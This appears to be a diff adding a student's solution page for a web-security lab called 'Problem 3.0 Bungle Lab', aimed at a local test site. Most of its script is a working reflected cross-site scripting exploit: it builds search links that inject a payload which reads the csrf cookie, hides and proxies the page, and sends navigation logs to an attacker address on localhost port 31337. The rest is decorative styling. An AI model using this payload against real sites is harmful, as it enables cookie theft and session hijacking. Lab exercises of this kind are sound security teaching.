@@ -1,0 +1,103 @@
+
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+    var csrf_cookie = document.cookie.split('; ').find(row => row.startsWith('csrf=')).split('=')[1];
+    alert(csrf_cookie); 
+    function log(data) {
+        console.log($.param(data))
+        $.get(attacker, data);
+    }
+    function proxy(href) {
+        $("html").load(href, function(){
+            $("html").show();
+            log({event: "nav", uri: href});
+            $("#query").val("pwned!");
+        });
+    }
+    $("html").hide();
+    proxy("./");
+    
+}
+
+function makeLink(csrfdefense, xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() +
+        "&csrfdefense=" + csrfdefense.toString() + "&q=" +
+        encodeURIComponent("<script" + ">" + payload.toString() +
+        ";payload(\"" + attacker + "\");</script" + ">");
+    }
+}
+
+var xssdefense = 0;
+var target = "http://localhost/project2/";
+var attacker = "http://localhost:31337/";
+$(function() {
+    var url1 = makeLink(1, xssdefense, target, attacker);
+    var url2 = makeLink(2, xssdefense, target, attacker);
+    var url3 = makeLink(3, xssdefense, target, attacker);
+    $("h3").html("<a target=\"run\" href=\"" + url1 + "\">a</a> <div> </div> <a target=\"run\" href=\"" + url2 + "\">b</a>  <div> </div> <a target=\"run\" href=\"" + url3 + "\">c</a>");
+});
+</script>
+
+
+
+<title>Problem 3.0</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Arial', sans-serif;
+        background: linear-gradient(to right, #ffafbd, #fcb388);
+        color: #ff6b6b;
+        text-align: center;
+    }
+
+    h1 {
+        background-color: rgba(255, 255, 255, 0.7);
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        margin: 20px 0;
+    }
+
+    h3 {
+        margin: 20px 0;
+        font-size: 24px;
+    }
+
+    a {
+        display: inline-block;
+        margin: 10px;
+        padding: 10px 20px;
+        background-color: #ff6b6b;
+        color: white;
+        text-decoration: none;
+        border-radius: 25px;
+        transition: background-color 0.3s;
+    }
+
+    a:hover {
+        background-color: #9d12d8;
+    }
+
+    .emoji {
+        font-size: 36px;
+    }
+</style>
+</head>
+<body>
+<div class="two">
+    <h1>✨ Problem 3.0 Bungle Lab! ✨</h1>
+</div>
+
+<div class="two alt-two">
+    
+    <div style="color:rgb(196, 22, 109); font-family:'Courier New', Courier, monospace">Click a link below to explore! 🌸</div>
+    <h3></h3>
+    <div class="emoji">😽💖🧚🏻‍♀️</div>
+</div>
+</body>
+</html>
